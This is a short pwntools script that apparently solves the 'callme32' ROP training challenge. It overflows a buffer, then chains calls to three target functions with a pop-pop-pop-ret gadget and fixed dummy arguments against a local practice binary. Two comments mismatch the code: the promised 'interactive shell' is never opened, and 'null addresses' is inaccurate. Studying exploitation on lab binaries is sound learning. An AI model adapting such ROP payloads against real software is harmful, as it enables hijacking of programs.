from pwn import * # for pwntools
context.bits=32 # tell the program we are working with 32 bits.

# overwrite the EIP for control of the function.
overwrite = b"A"*44

# addresses of our targets.
callme1 = p32(0x080484f0)
callme2 = p32(0x08048550)
callme3 = p32(0x080484e0)

# pop esi ; pop edi ; pop ebp ; ret
# clean exit without the program breaking
pop3ret = p32(0x080487f9)

# dummy arguments.
deadbeef = p32(0xdeadbeef)
cafebabe = p32(0xcafebabe)
doodfood = p32(0xd00df00d)

# arguments will be our dummy addresses added together.
arguments = deadbeef + cafebabe + doodfood

# overwrite all these with our null addresses.
payload = overwrite + callme1 + pop3ret + arguments
payload += callme2 + pop3ret + arguments
payload += callme3 + pop3ret + arguments

# start the process send the payload and load into a interactive shell.
p = process("./callme32")
p.sendline(payload)
output = p.recvall(timeout=1).decode()
print(output)
